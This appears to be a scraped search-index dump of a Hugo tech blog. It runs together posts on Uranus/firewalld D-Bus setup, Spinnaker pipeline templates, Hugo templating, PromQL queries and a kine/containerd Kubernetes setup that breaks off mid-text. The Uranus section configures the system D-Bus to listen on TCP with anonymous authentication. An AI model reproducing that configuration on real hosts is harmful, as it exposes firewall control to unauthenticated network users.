matching system.d/*.conf in the same directory as this one, with a \u0026lt;busconfig\u0026gt; element containing configuration directives. These directives can override D-Bus or OS defaults. For upstream or distribution-wide defaults that can be overridden by a local sysadmin, create files matching /usr/share/dbus-1/system.d/*.conf instead. --\u0026gt; \u0026lt;!DOCTYPE busconfig PUBLIC \u0026quot;-//freedesktop//DTD D-Bus Bus Configuration 1.0//EN\u0026quot; \u0026quot;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\u0026quot;\u0026gt; \u0026lt;busconfig\u0026gt; \u0026lt;listen\u0026gt;tcp:host=10.0.0.3,bind=*,port=55556,family=ipv4\u0026lt;/listen\u0026gt; \u0026lt;listen\u0026gt;unix:tmpdir=/tmp\u0026lt;/listen\u0026gt; \u0026lt;!-- Add this part --\u0026gt; \u0026lt;policy context=\u0026quot;default\u0026quot;\u0026gt; \u0026lt;allow user=\u0026quot;root\u0026quot; /\u0026gt; \u0026lt;allow own=\u0026quot;com.github.cylonchau.Uranus\u0026quot; /\u0026gt; \u0026lt;!-- allow uranus resiger to dbus-daemon --\u0026gt; \u0026lt;!-- if requseter is com.github.cylonchau.Uranus and request path is /org/fedoraproject/FirewallD1, then allow --\u0026gt; \u0026lt;allow receive_sender=\u0026quot;com.github.cylonchau.Uranus\u0026quot; receive_path=\u0026quot;/org/fedoraproject/FirewallD1\u0026quot; /\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;auth\u0026gt;ANONYMOUS\u0026lt;/auth\u0026gt; \u0026lt;allow_anonymous/\u0026gt; \u0026lt;/busconfig\u0026gt; Enable dbus tcp port Edit /usr/lib/systemd/system/dbus.socket\n[Unit] Description=D-Bus System Message Bus Socket [Socket] ListenStream=/var/run/dbus/system_bus_socket ListenStream=55556 # \u0026lt;- Add this Reload service\nsystemctl reload firewalld Debian Edit /etc/dbus-1/system.conf\n\u0026lt;!DOCTYPE busconfig PUBLIC \u0026quot;-//freedesktop//DTD D-Bus Bus Configuration 1.0//EN\u0026quot; \u0026quot;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\u0026quot;\u0026gt; \u0026lt;busconfig\u0026gt; \u0026lt;listen\u0026gt;tcp:host=10.0.0.3,bind=*,port=55556,family=ipv4\u0026lt;/listen\u0026gt; \u0026lt;listen\u0026gt;unix:tmpdir=/tmp\u0026lt;/listen\u0026gt; \u0026lt;!-- Add this part --\u0026gt; \u0026lt;policy context=\u0026quot;default\u0026quot;\u0026gt; \u0026lt;allow user=\u0026quot;root\u0026quot; /\u0026gt; \u0026lt;allow own=\u0026quot;com.github.cylonchau.Uranus\u0026quot; /\u0026gt; \u0026lt;!-- allow uranus resiger to dbus-daemon --\u0026gt; \u0026lt;!-- if requseter is com.github.cylonchau.Uranus and request path is /org/fedoraproject/FirewallD1, then allow --\u0026gt; \u0026lt;allow receive_sender=\u0026quot;com.github.cylonchau.Uranus\u0026quot; receive_path=\u0026quot;/org/fedoraproject/FirewallD1\u0026quot; /\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;auth\u0026gt;ANONYMOUS\u0026lt;/auth\u0026gt; \u0026lt;allow_anonymous/\u0026gt; \u0026lt;/busconfig\u0026gt; Edit /usr/lib/systemd/system/dbus.socket\n[Unit] Description=D-Bus System Message Bus Socket # Add this part [Socket] ListenStream=/var/run/dbus/system_bus_socket ListenStream=55556 Add managed firewalld Linux host to Uranus Add host\n","permalink":"https://www.oomkill.com/2024/08/uranus-installation/","summary":"What is an Uranus?","title":"Uranus installation"},{"content":"Manual Judgment Stage “Manual Judgment Stage” 是 Spinnaker Pipeline 中的一种阶段 (\u0026ldquo;Stage\u0026rdquo;) 类型，该类型可以作为流水线的门户，作为带外 (Out-of-Bound) 流水线检查，等待手动检查，并且判断结果会终止或继续流水线的执行。\n创建一个基于Manual Judgment的流水线 创建一个流水线，添加一个新的 Stage，选择 “Manual Judgment”\n图：Manual Judgment创建页面 Jugement Inputs 部分添加对应的选项，选项可以带入变量 $judgment 中\n图：Manual Judgment 在执行时 Jugement Inputs Option 的展示 或者是不添加任何选项，那么这个时候就会只有 Stop 和 Continue 两个按钮\n图：当 Manual Judgment 没有配置Jugement Inputs Option 的展示 如果添加了选项，可以根据 “选项” 来判断执行的分支\n判断可以使用每个阶段内的条件表达式 ”Conditional on Expression“，或者 Check Precondition 类型的阶段\n图：根据 “Stage Conditional on Expression” 来定义的选项 “Check Precondition” 是 Spinnaker 流水线中的一个阶段，它可以先前条件并且判断是否继续，这里主要检查该流水线之前所有的流水线你定义要检查的内容，并继续执行接下分支或者阶段\n图：“Check Precondition” 的三种类型 图：“Check Precondition” 选择添加表达式的页面 这里选择使用 表达式 (Expression) 来判断前置条件，例如我判断前置 Stage 的选择是否为 “aaaa”\n${#judgment(\u0026quot;Ask for next step\u0026quot;) == 'aaa'}\n接下来根据正常的流水线来创建即可，例如要 Deploy K8S 资源\n图：“Deploy” 类型的阶段配置页面 Reference [1] Changing pipeline behavior based on selected judgment\n","permalink":"https://www.oomkill.com/2024/07/spinnaker-branching-judgment/","summary":"","title":"Spinnaker 基于判断的条件分支流水线"},{"content":"流水线模板组合思路 官方流水线示例中没有给出完整的流水线模板和完整的字段，只给出了一个大致的 schema [1]，如下所示\n{ \u0026quot;schema\u0026quot;: \u0026quot;v2\u0026quot;, \u0026quot;variables\u0026quot;: [ { \u0026quot;type\u0026quot;: \u0026quot;\u0026lt;type\u0026gt;\u0026quot;, \u0026quot;defaultValue\u0026quot;: \u0026lt;value\u0026gt;, \u0026quot;description\u0026quot;: \u0026quot;\u0026lt;description\u0026gt;\u0026quot;, \u0026quot;name\u0026quot;: \u0026quot;\u0026lt;varName\u0026gt;\u0026quot; } ], \u0026quot;id\u0026quot;: \u0026quot;\u0026lt;templateName\u0026gt;\u0026quot;, # The pipeline instance references the template using this \u0026quot;protect\u0026quot;: \u0026lt;true | false\u0026gt;, \u0026quot;metadata\u0026quot;: { \u0026quot;name\u0026quot;: \u0026quot;displayName\u0026quot;, # The display name shown in Deck \u0026quot;description\u0026quot;: \u0026quot;\u0026lt;description\u0026gt;\u0026quot;, \u0026quot;owner\u0026quot;: \u0026quot;example@example.com\u0026quot;, \u0026quot;scopes\u0026quot;: [\u0026quot;global\u0026quot;] # Not used }, \u0026quot;pipeline\u0026quot;: { # Contains the templatized pipeline itself \u0026quot;lastModifiedBy\u0026quot;: \u0026quot;anonymous\u0026quot;, # Not used \u0026quot;updateTs\u0026quot;: \u0026quot;0\u0026quot;, # Not used \u0026quot;parameterConfig\u0026quot;: [], # Same as in a regular pipeline \u0026quot;limitConcurrent\u0026quot;: true, # Same as in a regular pipeline \u0026quot;keepWaitingPipelines\u0026quot;: false, # Same as in a regular pipeline \u0026quot;description\u0026quot;: \u0026quot;\u0026quot;, # Same as in a regular pipeline \u0026quot;triggers\u0026quot;: [], # Same as in a regular pipeline \u0026quot;notifications\u0026quot;: [], # Same as in a regular pipeline \u0026quot;stages\u0026quot;: [ # Contains the templated stages { # This one is an example stage: \u0026quot;waitTime\u0026quot;: \u0026quot;${ templateVariables.waitTime }\u0026quot;, # Templated field. \u0026quot;name\u0026quot;: \u0026quot;My Wait Stage\u0026quot;, \u0026quot;type\u0026quot;: \u0026quot;wait\u0026quot;, \u0026quot;refId\u0026quot;: \u0026quot;wait1\u0026quot;, \u0026quot;requisiteStageRefIds\u0026quot;: [] } ] } } 这个流水线模板的 Schema 只包含了大的框架，但是 Spinnaker 的每种类型的 Stage 的 Schema 并没有包含里面，需要自行定义，最好的一个思路就是，先手动先创建一个 {ipeline，然后编辑这个 Pipeline 的 Json 复制出想要的 Stage 的内容，然后再根据 Pipeline Template 的模板进行填充。\n例如，我们想顶一个选择 “多路分支” 的流水线，那么流水线类型如下\n图：spinnaker流水线结构 然后选择 “Edit stage as Json” 或者选择 “Pipeline Actions” 中 “Edit as JSON” 可以查看到该 Stage 或该 Pipelin 完整的 JSON 格式数据。\n图：Pipeline Stage JSON 图：Pipeline JSON 最后将 Stage 的 JSON 复制 到 template Stage 的 数组中即可，下面是一个 Check Precondition 类型的 State 的 JSON\n{ \u0026quot;completeOtherBranchesThenFail\u0026quot;: false, \u0026quot;continuePipeline\u0026quot;: false, \u0026quot;failPipeline\u0026quot;: false, \u0026quot;name\u0026quot;: \u0026quot;选择禁用是否启用配置注册\u0026quot;, \u0026quot;notifications\u0026quot;: [], \u0026quot;preconditions\u0026quot;: [ { \u0026quot;context\u0026quot;: { \u0026quot;expression\u0026quot;: \u0026quot;${ #judgment('check condition') == 'disable' }\u0026quot; }, \u0026quot;failPipeline\u0026quot;: true, \u0026quot;type\u0026quot;: \u0026quot;expression\u0026quot; } ], \u0026quot;type\u0026quot;: \u0026quot;checkPreconditions\u0026quot; } 完整的基于分支判断的流水线模板示例 该模板是一个为 k8s deployment 启用/禁用 HPA 功能的流水线模板\n{ \u0026quot;id\u0026quot;: \u0026quot;a422e02d0ab94ce23jk92a6d2bf8ff9c\u0026quot;, \u0026quot;lastModifiedBy\u0026quot;: \u0026quot;cylon\u0026quot;, \u0026quot;metadata\u0026quot;: { \u0026quot;description\u0026quot;: \u0026quot;启用或停用 HPA\u0026quot;, \u0026quot;name\u0026quot;: \u0026quot;HPA Turn on or Turn off\u0026quot;, \u0026quot;owner\u0026quot;: \u0026quot;cylonchau@outlook.com\u0026quot;, \u0026quot;scopes\u0026quot;: [ \u0026quot;global\u0026quot; ] }, \u0026quot;pipeline\u0026quot;: { \u0026quot;expectedArtifacts\u0026quot;: [ { \u0026quot;defaultArtifact\u0026quot;: { \u0026quot;artifactAccount\u0026quot;: \u0026quot;k8s-cluster-102\u0026quot;, \u0026quot;reference\u0026quot;: \u0026quot;https://git.chinamobile.cn/api/v4/projects/154/repository/files/hpa%2Fk8s-cluster-102%2F${ templateVariables.appName }.yaml/raw\u0026quot;, \u0026quot;type\u0026quot;: \u0026quot;gitlab/file\u0026quot;, \u0026quot;version\u0026quot;: \u0026quot;master\u0026quot; }, \u0026quot;displayName\u0026quot;: \u0026quot;${ templateVariables.appName }-hpa-file\u0026quot;, \u0026quot;id\u0026quot;: \u0026quot;${ templateVariables.appName }-hpa\u0026quot;, \u0026quot;matchArtifact\u0026quot;: { \u0026quot;artifactAccount\u0026quot;: \u0026quot;k8s-cluster-102\u0026quot;, \u0026quot;name\u0026quot;: \u0026quot;https://git.chinamobile.cn/api/v4/projects/154/repository/files/hpa%2Fk8s-cluster-102%2F${ templateVariables.appName }.yaml/raw\u0026quot;, \u0026quot;type\u0026quot;: \u0026quot;gitlab/file\u0026quot; }, \u0026quot;useDefaultArtifact\u0026quot;: true, \u0026quot;usePriorArtifact\u0026quot;: false } ], \u0026quot;keepWaitingPipelines\u0026quot;: false, \u0026quot;limitConcurrent\u0026quot;: true, \u0026quot;parameterConfig\u0026quot;: [], \u0026quot;stages\u0026quot;: [ { \u0026quot;instructions\u0026quot;: \u0026quot;请选择条件: \\n\\tenable 启用 ${ templateVariables.appName } HPA Autoscaler\\n\\tdisable 禁用HPA Autoscaler\\n\u0026quot;, \u0026quot;judgmentInputs\u0026quot;: [ { \u0026quot;value\u0026quot;: \u0026quot;enable\u0026quot; }, { \u0026quot;value\u0026quot;: \u0026quot;disable\u0026quot; } ], \u0026quot;name\u0026quot;: \u0026quot;Apply\u0026quot;, \u0026quot;completeOtherBranchesThenFail\u0026quot;: false, \u0026quot;continuePipeline\u0026quot;: false, \u0026quot;failPipeline\u0026quot;: false, \u0026quot;notifications\u0026quot;: [], \u0026quot;propagateAuthenticationContext\u0026quot;: false, \u0026quot;refId\u0026quot;: \u0026quot;7\u0026quot;, \u0026quot;requisiteStageRefIds\u0026quot;: [], \u0026quot;type\u0026quot;: \u0026quot;manualJudgment\u0026quot; }, { \u0026quot;completeOtherBranchesThenFail\u0026quot;: false, \u0026quot;continuePipeline\u0026quot;: false, \u0026quot;failPipeline\u0026quot;: false, \u0026quot;name\u0026quot;: \u0026quot;选择禁用 ${ templateVariables.appName } HPA\u0026quot;, \u0026quot;preconditions\u0026quot;: [ { \u0026quot;context\u0026quot;: { \u0026quot;expression\u0026quot;: \u0026quot;${ #judgment('Apply') == 'disable' }\u0026quot; }, \u0026quot;failPipeline\u0026quot;: true, \u0026quot;type\u0026quot;: \u0026quot;expression\u0026quot; } ], \u0026quot;refId\u0026quot;: \u0026quot;9\u0026quot;, \u0026quot;requisiteStageRefIds\u0026quot;: [ \u0026quot;7\u0026quot; ], \u0026quot;type\u0026quot;: \u0026quot;checkPreconditions\u0026quot; }, { \u0026quot;name\u0026quot;: \u0026quot;选择启用 ${ templateVariables.appName } HPA\u0026quot;, \u0026quot;completeOtherBranchesThenFail\u0026quot;: false, \u0026quot;continuePipeline\u0026quot;: false, \u0026quot;failPipeline\u0026quot;: false, \u0026quot;preconditions\u0026quot;: [ { \u0026quot;context\u0026quot;: { \u0026quot;expression\u0026quot;: \u0026quot;${ #judgment('Apply HPA') == 'enable' }\u0026quot; }, \u0026quot;failPipeline\u0026quot;: true, \u0026quot;type\u0026quot;: \u0026quot;expression\u0026quot; } ], \u0026quot;refId\u0026quot;: \u0026quot;10\u0026quot;, \u0026quot;requisiteStageRefIds\u0026quot;: [ \u0026quot;7\u0026quot; ], \u0026quot;type\u0026quot;: \u0026quot;checkPreconditions\u0026quot; }, { \u0026quot;account\u0026quot;: \u0026quot;${ templateVariables.dcName }\u0026quot;, \u0026quot;app\u0026quot;: \u0026quot;${ templateVariables.appName }\u0026quot;, \u0026quot;cloudProvider\u0026quot;: \u0026quot;kubernetes\u0026quot;, \u0026quot;completeOtherBranchesThenFail\u0026quot;: false, \u0026quot;continuePipeline\u0026quot;: false, \u0026quot;failPipeline\u0026quot;: false, \u0026quot;isNew\u0026quot;: true, \u0026quot;location\u0026quot;: \u0026quot; ${ templateVariables.appLocation }\u0026quot;, \u0026quot;manifestName\u0026quot;: \u0026quot;horizontalpodautoscaler ${ templateVariables.appName }-autoscaler\u0026quot;, \u0026quot;mode\u0026quot;: \u0026quot;static\u0026quot;, \u0026quot;name\u0026quot;: \u0026quot;禁用 ${ templateVariables.appName } HPA\u0026quot;, \u0026quot;options\u0026quot;: { \u0026quot;cascading\u0026quot;: false, \u0026quot;gracePeriodSeconds\u0026quot;: 300 }, \u0026quot;refId\u0026quot;: \u0026quot;12\u0026quot;, \u0026quot;requisiteStageRefIds\u0026quot;: [ \u0026quot;9\u0026quot; ], \u0026quot;type\u0026quot;: \u0026quot;deleteManifest\u0026quot; }, { \u0026quot;account\u0026quot;: \u0026quot;${ templateVariables.dcName }\u0026quot;, \u0026quot;cloudProvider\u0026quot;: \u0026quot;kubernetes\u0026quot;, \u0026quot;manifestArtifactAccount\u0026quot;: \u0026quot;k8s-cluster-102\u0026quot;, \u0026quot;manifestArtifactId\u0026quot;: \u0026quot;${ templateVariables.appName }-hpa\u0026quot;, \u0026quot;completeOtherBranchesThenFail\u0026quot;: false, \u0026quot;continuePipeline\u0026quot;: false, \u0026quot;failPipeline\u0026quot;: false, \u0026quot;moniker\u0026quot;: { \u0026quot;app\u0026quot;: \u0026quot;${ templateVariables.appName }\u0026quot; }, \u0026quot;name\u0026quot;: \u0026quot;启用 ${ templateVariables.appName } HPA\u0026quot;, \u0026quot;refId\u0026quot;: \u0026quot;11\u0026quot;, \u0026quot;requisiteStageRefIds\u0026quot;: [ \u0026quot;10\u0026quot; ], \u0026quot;skipExpressionEvaluation\u0026quot;: false, \u0026quot;source\u0026quot;: \u0026quot;artifact\u0026quot;, \u0026quot;stageTimeoutMs\u0026quot;: 500000, \u0026quot;trafficManagement\u0026quot;: { \u0026quot;enabled\u0026quot;: false, \u0026quot;options\u0026quot;: { \u0026quot;enableTraffic\u0026quot;: false, \u0026quot;services\u0026quot;: [] } }, \u0026quot;type\u0026quot;: \u0026quot;deployManifest\u0026quot; } ], \u0026quot;triggers\u0026quot;: [] }, \u0026quot;protect\u0026quot;: false, \u0026quot;schema\u0026quot;: \u0026quot;v2\u0026quot;, \u0026quot;tag\u0026quot;: null, \u0026quot;updateTs\u0026quot;: \u0026quot;1701832158029\u0026quot;, \u0026quot;variables\u0026quot;: [ { \u0026quot;defaultValue\u0026quot;: \u0026quot;k8s-cluster-102\u0026quot;, \u0026quot;description\u0026quot;: \u0026quot;要部署到的集群\u0026quot;, \u0026quot;name\u0026quot;: \u0026quot;dcName\u0026quot;, \u0026quot;type\u0026quot;: \u0026quot;string\u0026quot; }, { \u0026quot;defaultValue\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;description\u0026quot;: \u0026quot;模块名称\u0026quot;, \u0026quot;name\u0026quot;: \u0026quot;appName\u0026quot;, \u0026quot;type\u0026quot;: \u0026quot;string\u0026quot; }, { \u0026quot;defaultValue\u0026quot;: \u0026quot;public\u0026quot;, \u0026quot;description\u0026quot;: \u0026quot;名称空间\u0026quot;, \u0026quot;name\u0026quot;: \u0026quot;appLocation\u0026quot;, \u0026quot;type\u0026quot;: \u0026quot;string\u0026quot; } ] } Reference [1] Pipeline template JSON\n","permalink":"https://www.oomkill.com/2024/07/spinnaker-custom-template/","summary":"","title":"Spinnaker 自定义Pipeline模板思路"},{"content":"需求 在页面底部增加相关阅读区域：\n简单实现与文章相同 tag 的文章列出到文章底部 实验步骤 新增 related 模板 在 layouts/partials/related.html 新创建一个模板，增加如下内容，本文主题为 PaperModX ，不同的主题，文件在不同目录下\n{{ $related := .Site.RegularPages.Related . | first 3 }} {{ with $related }} \u0026lt;h3\u0026gt;Related Posts\u0026lt;/h3\u0026gt; \u0026lt;ul\u0026gt; {{ range . }} \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;{{ .RelPermalink }}\u0026quot;\u0026gt;{{ .Title }}\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; {{ end }} \u0026lt;/ul\u0026gt; {{ end }} 将模板加载到文章列表模板内 然后需要在文章列表页底部包含这个 “模板” _default/single.html 不同主题在不同的目录下\n... \u0026lt;!-- 分割线 --\u0026gt; \u0026lt;!-- Related --\u0026gt; \u0026lt;!-- 这个判断因为相关阅读增加了分割线，所以判断是指定页面就不在加载相关阅读和分割线了 --\u0026gt; {{ if and (not (strings.Contains .RelPermalink \u0026quot;/tags\u0026quot;)) (not (strings.Contains .RelPermalink \u0026quot;/posts\u0026quot;)) (not (strings.Contains .RelPermalink \u0026quot;/archives\u0026quot;)) (not (strings.Contains .RelPermalink \u0026quot;/search\u0026quot;)) (not (strings.Contains .RelPermalink \u0026quot;/about\u0026quot;)) }} \u0026lt;div class=\u0026quot;comments-separator\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; {{ partial \u0026quot;related.html\u0026quot; . }} {{- end }} \u0026lt;!-- /Related --\u0026gt; \u0026lt;!-- gittalk --\u0026gt; {{- if not (.Param \u0026quot;noComments\u0026quot;) }} {{ if and (not (strings.Contains .RelPermalink \u0026quot;/tags\u0026quot;)) (not (strings.Contains .RelPermalink \u0026quot;/posts\u0026quot;)) (not (strings.Contains .RelPermalink \u0026quot;/archives\u0026quot;)) (not (strings.Contains .RelPermalink \u0026quot;/search\u0026quot;)) (not (strings.Contains .RelPermalink \u0026quot;/about\u0026quot;)) }} \u0026lt;div class=\u0026quot;comments-separator\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; {{- end }} {{- partial \u0026quot;comments.html\u0026quot; . }} {{- end }} Reference [1] How to Add Related Posts Section in Hugo\n","permalink":"https://www.oomkill.com/2024/07/hugo-add-related-content-section/","summary":"","title":"Hugo - 为文章页面增加相关阅读区域"},{"content":"查询结果删除某些指标 without without 属于聚合查询的子句，必须在聚合查询中使用\n语法：\n\u0026lt;aggr-op\u0026gt; [without|by (\u0026lt;label list\u0026gt;)] ([parameter,] \u0026lt;vector expression\u0026gt;) 可以看到属于 \u0026lt;aggr-op\u0026gt;\n例如\nsum without(instance) (http_requests_total) ignoring ignoring 属于 “向量匹配” (Vector matching) 关键词，可以在 一对多，和多对多查询中使用\n语法\n\u0026lt;vector expr\u0026gt; \u0026lt;bin-op\u0026gt; ignoring(\u0026lt;label list\u0026gt;) \u0026lt;vector expr\u0026gt; 例如\nmethod_code:http_errors:rate5m{code=\u0026quot;500\u0026quot;} / ignoring(code) method:http_requests:rate5m 与查询 可以查询满足多个条件的指标，例如下列是查询 jvm 内存 $\\frac{used}{committed} \u0026gt; 80%$ 并且 Pod WSS 使用大于 80% 的指标\nsum by(pod) (jvm_memory_used_bytes{}) / sum by(pod) (jvm_memory_committed_bytes{}) \u0026gt; .8 and sum(node_namespace_pod_container:container_memory_working_set_bytes{}) by (pod) / on(pod) group_left sum(kube_pod_container_resource_limits{resource=\u0026quot;memory\u0026quot;}) by (pod) \u0026gt; .8 向量查询 向量查询关键词为 on 和 ignoring\non 仅考虑表达式内提供的标签相同的，ignoring 允许在匹配时间序列时忽略指定的标签。\n语法 一对一\n\u0026lt;vector expr\u0026gt; \u0026lt;bin-op\u0026gt; ignoring(\u0026lt;label list\u0026gt;) \u0026lt;vector expr\u0026gt; \u0026lt;vector expr\u0026gt; \u0026lt;bin-op\u0026gt; on(\u0026lt;label list\u0026gt;) \u0026lt;vector expr\u0026gt; 多对一或一对多\n\u0026lt;vector expr\u0026gt; \u0026lt;bin-op\u0026gt; ignoring(\u0026lt;label list\u0026gt;) group_left(\u0026lt;label list\u0026gt;) \u0026lt;vector expr\u0026gt; \u0026lt;vector expr\u0026gt; \u0026lt;bin-op\u0026gt; ignoring(\u0026lt;label list\u0026gt;) group_right(\u0026lt;label list\u0026gt;) \u0026lt;vector expr\u0026gt; \u0026lt;vector expr\u0026gt; \u0026lt;bin-op\u0026gt; on(\u0026lt;label list\u0026gt;) group_left(\u0026lt;label list\u0026gt;) \u0026lt;vector expr\u0026gt; \u0026lt;vector expr\u0026gt; \u0026lt;bin-op\u0026gt; on(\u0026lt;label list\u0026gt;) group_right(\u0026lt;label list\u0026gt;) \u0026lt;vector expr\u0026gt; 向量查询的高级用法 通过一个 metrcs 上的 label 的值去查询另外一个 metric 上这个标签的值\ncontainer_memory_rss{container=~\u0026quot;.*$module.*\u0026quot;} on(pod) vm_memory_used_bytes{instance=~\u0026quot;$module.*\u0026quot;} 查询不同标签上的相同标签值的内容，例如，我想通过 **jvm_memory_used_bytes **指标上 pod label 为 “aaaa” 的 label，去查询 container_memory_rss 上 container label 为 “aaaa” 的指标内容，这个时候可以使用 label_replace 来重写不同的 label 为相同的值，on() 函数中添加相同指标的值即可完成查询。\n如下所示\nsum without( node,instance,job,name,id,image,metrics_path,endpoint,service,pod)( label_replace( container_memory_rss{container=~\u0026quot;.*$module.*\u0026quot;,} ,\u0026quot;ints\u0026quot;,\u0026quot;$1\u0026quot;,\u0026quot;pod\u0026quot;, \u0026quot;(.*)\u0026quot; ) ) != on(ints) group_left() sum by(ints) (sum without (job,pod,container) ( label_replace( jvm_memory_used_bytes{instance=\u0026quot;$instance\u0026quot;} ,\u0026quot;ints\u0026quot;,\u0026quot;$1\u0026quot;,\u0026quot;pod\u0026quot;, \u0026quot;(.*)\u0026quot; ) ) ) Reference [1] Optimizing, and Logical Grouping of Queries [2] Using group_left to calculate label proportions [3] Inside some complex Prometheus queries [4] Operators ","permalink":"https://www.oomkill.com/2024/07/promql-advanced/","summary":"","title":"PromQL复杂使用示例"},{"content":"需求 在不禁用分类的情况下，关闭对应 sitemap.xml 中的条目以优化 SEO\n去除所有tag 去除所有分类 去除 search about me 这类页面 实验步骤 sitemap 是通过 go-template 目标进行的，只要可以使用对应语法过滤了相关路径即可以排除对应的页面\n首先在配置文件增加 taxonomiesExcludedFromSitemap 选项，这个选项排除了 “hugo中分类法” 中的所有子类；其次使用 if not 来排除所有对应首页面。如下列所示\n本文已 PaperModX 为例，修改文件 layouts\\sitemap.xml\n{{ printf \u0026quot;\u0026lt;?xml version=\\\u0026quot;1.0\\\u0026quot; encoding=\\\u0026quot;utf-8\\\u0026quot; standalone=\\\u0026quot;yes\\\u0026quot;?\u0026gt;\u0026quot; | safeHTML }} \u0026lt;urlset xmlns=\u0026quot;http://www.sitemaps.org/schemas/sitemap/0.9\u0026quot; xmlns:xhtml=\u0026quot;http://www.w3.org/1999/xhtml\u0026quot;\u0026gt; {{ range .Data.Pages }} {{ if and (not (in .Site.Params.taxonomiesExcludedFromSitemap .Data.Plural)) (not (strings.Contains .RelPermalink \u0026quot;/tags\u0026quot;)) (not (strings.Contains .RelPermalink \u0026quot;/posts\u0026quot;)) (not (strings.Contains .RelPermalink \u0026quot;/archives\u0026quot;)) (not (strings.Contains .RelPermalink \u0026quot;/search\u0026quot;)) (not (strings.Contains .RelPermalink \u0026quot;/about\u0026quot;)) }} \u0026lt;url\u0026gt; \u0026lt;loc\u0026gt;{{ .Permalink }}\u0026lt;/loc\u0026gt; {{ if not .Lastmod.IsZero }} \u0026lt;lastmod\u0026gt;{{ safeHTML ( .Lastmod.Format \u0026quot;2006-01-02T15:04:05-07:00\u0026quot; ) }}\u0026lt;/lastmod\u0026gt; {{ end }} {{ with .Sitemap.ChangeFreq }} \u0026lt;changefreq\u0026gt;{{ . }}\u0026lt;/changefreq\u0026gt; {{ end }} {{- if ge .Sitemap.Priority 0.0 -}} {{- $weeks := div (sub now.Unix .Lastmod.Unix) 604800 -}} {{- $priority := sub 1 (div $weeks 10.0 ) -}} {{- if ge .Sitemap.Priority $priority -}} \u0026lt;priority\u0026gt;{{ .Sitemap.Priority }}\u0026lt;/priority\u0026gt; {{- else -}} {{- if ge $priority 1.0 -}} \u0026lt;priority\u0026gt;1.0\u0026lt;/priority\u0026gt; {{- else -}}\t\u0026lt;priority\u0026gt;{{ $priority }}\u0026lt;/priority\u0026gt; {{- end -}} {{- end -}} {{- end -}} {{ if .IsTranslated }} {{ range .Translations }} \u0026lt;xhtml:link rel=\u0026quot;alternate\u0026quot; hreflang=\u0026quot;{{ .Language.Lang }}\u0026quot; href=\u0026quot;{{ .Permalink }}\u0026quot; /\u0026gt;{{ end }} \u0026lt;xhtml:link rel=\u0026quot;alternate\u0026quot; hreflang=\u0026quot;{{ .Language.Lang }}\u0026quot; href=\u0026quot;{{ .Permalink }}\u0026quot; /\u0026gt;{{ end }} \u0026lt;/url\u0026gt; {{ end }} {{ end }} \u0026lt;/urlset\u0026gt; Reference [1] Hugo去除Sitemap中的tags\n","permalink":"https://www.oomkill.com/2024/07/hugo-sitemap-without-tag-page/","summary":"","title":"Hugo - 去除Sitemap中的tags search等页面"},{"content":"在本文中，将探讨使用 k3s 的 kine 项目来替换掉 etcd，并通过实验使用 kubeadm 去 run 一个 k8s 集群，并用 k3s 的 kine 项目来替换掉 etcd。\n为什么使用 kine etcd 在 Kubernetes 之外基本上没有应用的场景，并且 etcd 迭代也比较慢，由于没有人愿意维护因此一直在衰退 [1]，并且，Kubernetes 集群中，etcd 也是一个影响集群规模的重大因素。并且 K3S 存在一个项目 Kine 可以使用关系型数据库运行，这样对集群维护者来说可以不需要维护复杂的 etcd 集群，由于关系型数据库有很多高可用方案，这将使得 k8s 集群规模变成了无限可能。\nKine 介绍 前文提到，kubernetes (kube-apiserver) 与 etcd 是耦合的，如果我们要使用 RDBMS 去替换 etcd 就需要实现 etcd 的接口，那么这个项目就是 Kine [2]。\nKine 是一个 etcdshim，处于 kube-apiserver 和 RDBMS 的中间层，它实现了 etcdAPI的子集（不是etcd的全部功能），Kine 在 RDBMS 数据库之上实现了简单的多版本并发控制；将所有信息存储在一个表中；每行存储此 key 的修订, key, 当前值, 先前值, 先前修订，以及表示该 Key 是已创建还是已删除的标记，通过这种机制可以作为 shim 层来替换 etcd。\n简单提一句，shim 是计算机程序设计中的术语，表现为一个小型函数库，服务等，通过截取 API 调用，修改传入参数，来处理自行处理对应操作或者将操作交由其它地方执行。\n总的来说 shim 是一种可以在新环境中支持老 API，也可以在老环境里支持新 API 辅助运行库或服务，在云原生场景中，我们经常看到 docker-shim，cri-shim 等。\n前提条件 本文实验环境使用的软件版本如下\n软件/硬件 版本 操作系统 Debian 11(bullseye) 2C/4G Kubernetes版本 v1.28.11(截至文章编写时间的最新版) Kubernetes集群部署工具 kubeadm Kine v0.11.10 (截至文章编写时间的最新版) MySQL Docker运行，镜像 mysql:5.7 使用 kubeadm 构建控制平面 为了展现 kine 的作用，首先我们需要准备一个 k8s 集群，这里简单使用 kubeadm + containerd 来构建一个 kuebrnetes 集群。\n安装 containerd 载入内核依赖项 containerd 或 docker 的安装都需要内核支持 overlay 和 br_netfilter 模块，overlay 为 containerd 运行的文件系统，netfiler 用于维护容器内 (inter-container) 的网络。所以我们需要加载对应的内核模块。\ncat \u0026lt;\u0026lt;EOF | tee /etc/modules-load.d/containerd.conf\roverlay\rbr_netfilter\rEOF\r手动执行下面命令\nmodprobe overlay \u0026amp;\u0026amp; \\\rmodprobe br_netfilter\r通过仓库 containerd contanerd 是作为 docker-ce 的下层，所以很多 Linux 发行版都有对应的包管理工具的仓库，这里面维护了基本上比较新的版本，可以直接在对应操作系统下载\nCentOS\nyum install yum-utils -y \u0026amp;\u0026amp; \\\ryum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo \u0026amp;\u0026amp; \\\ryum install containerd.io -y\rDebian\nDebian仓库中通常都有比较新版本的 containerd，可以直接安装\napt list|grep containerd\r安装\napt -y install containerd\r离线安装 如果需要离线环境安装的话，可以在手动下载 containerd 和 runc 后传入内网\n下载 Containerd 的二进制包，这里下载containerd-\u0026lt;VERSION\u0026gt;-\u0026lt;OS\u0026gt;-\u0026lt;ARCH\u0026gt;.tar.gz 格式名称的发行版，后边在单独下载安装 runc\nwget https://github.com/containerd/containerd/releases/download/v1.7.3/containerd-1.7.3-linux-amd64.tar.gz\r将其解压缩到 /usr/local 下:\ntar Cxzvf /usr/local containerd-1.7.3-linux-amd64.tar.gz\r接下来从 runc 的 